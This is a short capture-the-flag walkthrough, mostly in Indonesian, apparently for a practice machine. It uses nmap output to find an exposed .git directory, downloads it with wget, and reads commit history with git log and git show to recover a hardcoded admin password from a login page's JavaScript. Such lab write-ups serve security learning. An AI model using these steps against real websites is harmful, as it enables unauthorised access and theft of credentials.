PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.4.92:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Super Awesome Site!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
----------------------------------------------------------------------------
Ketika discan dengan gobuster bisa terlihat ada folder git yang bisa kita buka

Lalu kita bisa mengambil keselurahan folder git tersebut
wget -r http://10.10.4.92/.git/      

Melihat history log git. Ketika kita scroll terdapat pesan bahwa sedang membuat login page, catat commit_idnya
git log


commit 395e087334d613d5e423cdf8f7be27196a360459
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:17:43 2020 +0200

    Made the login page, boss!



Lalu gunakan perintah di bawah untuk melihat keseluruhan passwordnya
git show commit_id
git show 395e087334d613d5e423cdf8f7be27196a360459


Maka akan menampilkan keseluruhan source code login page. Ketika kita scroll maka akan terlihat javascript yang mengatur loginnya

```
 <script>
+      function login() {
+        let form = document.getElementById("login-form");
+        console.log(form.elements);
+        let username = form.elements["username"].value;
+        let password = form.elements["password"].value;
+        if (
+          username === "admin" &&
+          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
+        ) {
+          document.cookie = "login=1";
+          window.location.href = "/dashboard.html";
+        } else {
+          document.getElementById("error").innerHTML =
+            "INVALID USERNAME OR PASSWORD!";
+        }
+      }
+    </script>
```


